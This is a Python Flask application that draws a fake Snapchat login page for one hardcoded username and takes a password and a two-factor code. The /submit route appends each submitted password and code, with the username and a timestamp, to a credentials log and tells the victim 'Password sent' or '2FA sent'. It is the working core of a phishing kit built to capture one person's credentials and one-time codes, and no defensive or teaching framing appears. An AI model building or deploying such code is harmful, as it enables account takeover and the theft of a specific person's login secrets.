import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

HARDCODED_USER = "zexoghaith"

# Clean state
state = {
    'stage': 'login',           # login | password | 2fa | done
    'update_count': 0
}

def make_screenshot():
    """Generate a fresh Snapchat-looking screenshot for the current stage"""
    from PIL import Image, ImageDraw, ImageFont
    
    w, h = 1280, 720
    img = Image.new('RGB', (w, h), '#000000')
    draw = ImageDraw.Draw(img)

    try:
        big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 32)
        med = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
        small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 13)
    except:
        big = med = small = ImageFont.load_default()

    stage = state['stage']
    now = datetime.now().strftime("%H:%M:%S")
    state['update_count'] += 1

    # Black bg
    draw.rectangle([0,0,w,h], fill='#000000')

    # Top bar
    draw.rectangle([0,0,w,44], fill='#111111')
    draw.text((w//2-78, 3), "Snapchat", fill='#FFFC00', font=big)

    # Card
    cx, cy = 420, 55
    draw.rounded_rectangle([cx, cy, cx+440, cy+490], radius=12, fill='#1f1f1f')

    draw.text((cx+15, cy+10), "Log in to Snapchat", fill='white', font=med)

    # Username
    draw.rounded_rectangle([cx+15, cy+48, cx+425, cy+85], radius=6, fill='#2c2c2c')
    draw.text((cx+26, cy+57), "zexoghaith", fill='white', font=small)

    # Password
    draw.rounded_rectangle([cx+15, cy+95, cx+425, cy+132], radius=6, fill='#2c2c2c')
    if stage in ['password', '2fa', 'done']:
        draw.text((cx+26, cy+104), "••••••••••", fill='#22c55e', font=small)
    else:
        draw.text((cx+26, cy+104), "••••••••••", fill='#888888', font=small)

    # Button
    by = cy + 150
    if stage == 'password':
        draw.rounded_rectangle([cx+15, by, cx+425, by+40], radius=16, fill='#444444')
        draw.text((cx+115, by+9), "Logging in...", fill='#999999', font=med)
    else:
        draw.rounded_rectangle([cx+15, by, cx+425, by+40], radius=16, fill='#FFFC00')
        draw.text((cx+150, by+9), "Log In", fill='#000000', font=med)

    # Social buttons
    draw.rounded_rectangle([cx+15, by+52, cx+425, by+85], radius=14, fill='#2c2c2c')
    draw.text((cx+85, by+61), "Continue with Google", fill='white', font=small)

    draw.rounded_rectangle([cx+15, by+95, cx+425, by+128], radius=14, fill='#2c2c2c')
    draw.text((cx+90, by+104), "Continue with Apple", fill='white', font=small)

    # === BIG STAGE BANNERS ===
    if stage == 'password':
        draw.rounded_rectangle([cx+10, cy+210, cx+430, cy+310], radius=8, fill='#3f2a00')
        draw.text((cx+22, cy+225), "PASSWORD ENTERED", fill='#f59e0b', font=med)
        draw.text((cx+22, cy+258), "Log In button was clicked", fill='white', font=small)
        draw.text((cx+22, cy+282), "Waiting for Snapchat...", fill='#888', font=small)

    if stage == '2fa':
        draw.rounded_rectangle([cx+10, cy+210, cx+430, cy+340], radius=8, fill='#1e3a8a')
        draw.text((cx+25, cy+225), "2FA CODE NEEDED", fill='#60a5fa', font=med)
        draw.text((cx+25, cy+260), "Enter 6-digit code", fill='white', font=small)
        for i in range(6):
            draw.rectangle([cx+30 + i*40, cy+290, cx+30 + i*40 + 34, cy+322], outline='#3b82f6', width=2)

    if stage == 'done':
        draw.rounded_rectangle([cx+10, cy+210, cx+430, cy+340], radius=8, fill='#052e16')
        draw.text((cx+70, cy+250), "✓ LOGGED IN!", fill='#22c55e', font=med)

    # LIVE INDICATORS
    draw.rounded_rectangle([12, 555, 300, 600], radius=5, fill='#ef4444')
    draw.text((18, 562), f"UPDATE #{state['update_count']}", fill='white', font=med)

    draw.rounded_rectangle([12, 610, 460, 660], radius=5, fill='#22c55e')
    draw.text((18, 617), f"TIME: {now}", fill='black', font=med)

    draw.text((480, 620), f"STAGE: {stage}", fill='#ff8800', font=med)

    draw.rectangle([0, h-38, w, h], fill='#111')
    draw.text((8, h-31), "LIVE • changes only when you submit", fill='#22c55e', font=small)

    path = os.path.join(STATIC_DIR, 'screenshot.png')
    img.save(path, 'PNG')
    return path

def loop():
    global state
    print("[LOOP] Starting clean Snapchat simulation")
    
    # Force clean start
    state['stage'] = 'login'
    state['password_entered'] = False
    state['code_entered'] = False
    state['update_count'] = 0
    
    make_screenshot()
    state['started'] = True
    
    while True:
        make_screenshot()
        time.sleep(0.8)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    pw = (data.get('password') or '').strip()
    cd = (data.get('code') or '').strip()
    
    creds_log.append({'u': HARDCODED_USER, 'p': pw, 'c': cd, 't': str(datetime.now())})
    
    if pw:
        state['password_entered'] = True
        state['stage'] = 'password'
        state['last_action'] = 'password submitted'
        make_screenshot()
        return jsonify({'ok': True, 'msg': 'Password sent'})
    
    if cd and len(cd) >= 4:
        state['code_entered'] = True
        state['stage'] = '2fa'
        state['last_action'] = '2FA submitted'
        make_screenshot()
        return jsonify({'ok': True, 'msg': '2FA sent'})
    
    return jsonify({'ok': True})

@app.route('/screenshot')
def shot():
    make_screenshot()
    resp = send_from_directory(STATIC_DIR, 'screenshot.png')
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return resp

@app.route('/status')
def stat():
    return jsonify({
        'stage': state['stage'],
        'password_entered': state['password_entered'],
        'code_entered': state['code_entered'],
        'update_count': state['update_count'],
        'size': os.path.getsize(os.path.join(STATIC_DIR, 'screenshot.png')) if os.path.exists(os.path.join(STATIC_DIR, 'screenshot.png')) else 0
    })

@app.before_request
def boot():
    if not hasattr(app, 'boot'):
        app.boot = True
        threading.Thread(target=loop, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))